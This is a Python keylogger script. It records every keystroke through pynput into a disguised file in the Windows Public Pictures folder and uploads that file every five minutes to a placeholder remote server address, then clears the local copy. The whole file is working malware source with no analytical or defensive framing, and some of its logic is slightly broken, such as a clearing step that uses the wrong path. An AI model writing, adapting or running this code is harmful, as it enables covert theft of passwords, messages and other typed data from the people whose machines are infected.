import requests
from sched import scheduler
from time import time, sleep
from threading import Thread
from pynput.keyboard import Listener

scheduler_obj = scheduler(time, sleep)
error_occurred = False
loop = True


def on_press(key):
    with open(r"C:\Users\Public\Pictures\uffh.txt", "a") as keylog:
        try:
            word = str(key).strip("'")

            if word == "Key.space":
                word = " "
                keylog.write(word)
                keylog.flush()
            elif word == "Key.enter":
                word = "\n"
                keylog.write(word)
                keylog.flush()
            else:
                keylog.write(word)
                keylog.flush()
        except Exception as e:
            print(f"Error: {e}")


def send_file():
    global error_occurred
    try:
        files = {"file": open(r"C:\Users\Public\Pictures\uffh.txt", "rb")}
        requests.post("http://[your_ip_address]:8000/receive", files=files)
        open("uffh.txt", "w").close()
    except Exception as e:
        error_occurred = True


def send_file_scheduler():
    global error_occurred
    while not error_occurred:
        send_file()
        sleep(300)


listener = Listener(on_press=on_press)
listener_thread = Thread(target=listener.start)
listener_thread.start()
listener_thread.join()

scheduler_obj.enter(300, 1, send_file_scheduler)
scheduler_obj.run()

# r"C:\Users\Public\Pictures\keylog.txt", "rb"